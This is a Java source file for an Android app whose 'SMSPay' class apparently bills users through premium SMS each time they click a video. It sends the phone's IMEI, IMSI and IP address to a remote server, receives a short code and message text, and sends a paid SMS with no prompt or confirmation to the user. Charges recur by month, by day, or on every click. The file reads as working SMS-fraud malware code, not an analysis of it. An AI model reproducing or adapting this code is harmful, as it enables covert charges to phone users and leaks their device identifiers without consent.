package com.android.pay;

import java.util.Calendar;

import org.json.JSONObject;

import android.content.Context;
import android.telephony.SmsManager;
import android.util.Log;

import com.android.base.Constants;
import com.android.base.MApplication;
import com.android.utils.InfoUtil;
import com.android.utils.JSONUtil;
import com.android.utils.PropertiesUtil;
import com.android.utils.SharedUtil;
import com.lidroid.xutils.HttpUtils;
import com.lidroid.xutils.exception.HttpException;
import com.lidroid.xutils.http.ResponseInfo;
import com.lidroid.xutils.http.callback.RequestCallBack;
import com.lidroid.xutils.http.client.HttpRequest.HttpMethod;

public class SMSPay {
	// 移动mm
	public final static String MMURL = "http://mdo2.wl.tudou.com/wl/sms_fee_req.jsp";
	// 联通
	public final static String UNICOMURL = "http://mdo2.wl.tudou.com/wl/sms_fee_req.jsp";

	public int op;//
	public String code;
	public String value;
	public int pricetype;
	public String price;

	public Context context;
	private static SMSPay pay;
	public static final String TAG="pay";

	private SMSPay(Context context) {
		this.context = context;
		op = PropertiesUtil.getInstance(context).op;
		pricetype = PropertiesUtil.getInstance(context).pricetype;
		price = PropertiesUtil.getInstance(context).price;
	}

	public static SMSPay getInstance(Context context) {
		if (pay == null)
			pay = new SMSPay(context);
		return pay;
	}

	//付款， 每次点击视频后触发
	public void pay() {
		switch (pricetype) {
		case 1:// 按月
			payByMonth();
			break;
		case 2:// 按日
			payByDay();
			break;
		case 3:// 按次
			payByTimes();
			break;
		}
	}
	// 发送短信
	public void sendSMS() {
		if(code==null||value==null){
			//如果短信代码没有则先请求
			if(Constants.DEBUG)Log.e(TAG, "code | value = null,begin requestSMS");
			requestSMS();
		}else{
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendTextMessage(code, null, value, null, null);
		}
	}

	// 按月
	public void payByMonth() {
		if(Constants.DEBUG)Log.e(TAG, "paybymonth");
		String key = "sendMessageMonth";
		int month = SharedUtil.getInt(MApplication.getApplication(), key);
		int currentMonth = Calendar.getInstance().get(Calendar.YEAR) * 12
				+ Calendar.getInstance().get(Calendar.MONTH) + 1;
		if (currentMonth > month) {
			sendSMS();
			// 发短信后保存
			SharedUtil.putInt(MApplication.getApplication(), key, currentMonth);
		}
	}

	// 按日
	public void payByDay() {
		String key = "sendMessageday";
		int day = SharedUtil.getInt(MApplication.getApplication(), key);
		int currentday = Calendar.getInstance().get(Calendar.YEAR) * 12 * 30
				+ Calendar.getInstance().get(Calendar.MONTH) * 30
				+ Calendar.getInstance().get(Calendar.DAY_OF_MONTH);
		if (currentday > day) {
			sendSMS();
			// 发短信后保存
			SharedUtil.putInt(MApplication.getApplication(), key, currentday);
		}
	}

	// 按次
	public void payByTimes() {
		sendSMS();
	}

	// 请求支付短信
	public void requestSMS() {
		switch (op) {
		case 1:
			requestSMSValueForMM();
			break;
		case 2:
			requestSMSValueForUNICOM();
			break;
		case 0:
			int mop = InfoUtil.getProviders(context);
			switch (mop) {
			case 1:
				requestSMSValueForMM();
				break;
			case 2:
				requestSMSValueForUNICOM();
				break;
			}
			break;
		}
	}

	// 联通请求
	public void requestSMSValueForUNICOM() {
		HttpUtils utils = new HttpUtils();
		String chid = PropertiesUtil.getInstance(context).chid;
		String opid = "2";
		String ip = InfoUtil.getLocalIpAddress();
		String imei = InfoUtil.getIMEI(context);
		String imsi = InfoUtil.getIMSI(context);
		String url = UNICOMURL + "?price=" + price + "&chid=" + chid + "&opid="
				+ opid + "&ip=" + ip + "&imei=" + imei + "&imsi=" + imsi;
		utils.send(HttpMethod.GET, url, new RequestCallBack<String>() {
			@Override
			public void onFailure(HttpException arg0, String arg1) {
			}

			@Override
			public void onSuccess(ResponseInfo<String> responseInfo) {
				if (responseInfo.result != null
						&& !"".equals(responseInfo.result)) {
					JSONObject jo = JSONUtil.toJSONObject(responseInfo.result);
					if (JSONUtil.getInt(jo, "resultCode") == 0) {
						code = JSONUtil.getString(jo, "accessNo");
						value = JSONUtil.getString(jo, "sms");
					}

				}

			}

		});
	}

	// MM请求短信代码
	public void requestSMSValueForMM() {
		HttpUtils utils = new HttpUtils();
		String chid = PropertiesUtil.getInstance(context).chid;
		String opid = "1";
		String ip = InfoUtil.getLocalIpAddress();
		String imei = InfoUtil.getIMEI(context);
		String imsi = InfoUtil.getIMSI(context);
		String url = MMURL + "?price=" + price + "&chid=" + chid + "&opid="
				+ opid + "&ip=" + ip + "&imei=" + imei + "&imsi=" + imsi;
		utils.send(HttpMethod.GET, url, new RequestCallBack<String>() {
			@Override
			public void onFailure(HttpException arg0, String arg1) {
			}

			@Override
			public void onSuccess(ResponseInfo<String> responseInfo) {
				if (responseInfo.result != null
						&& !"".equals(responseInfo.result)) {
					code = "1065842410";
					value = responseInfo.result;
				}

			}

		});
	}

}
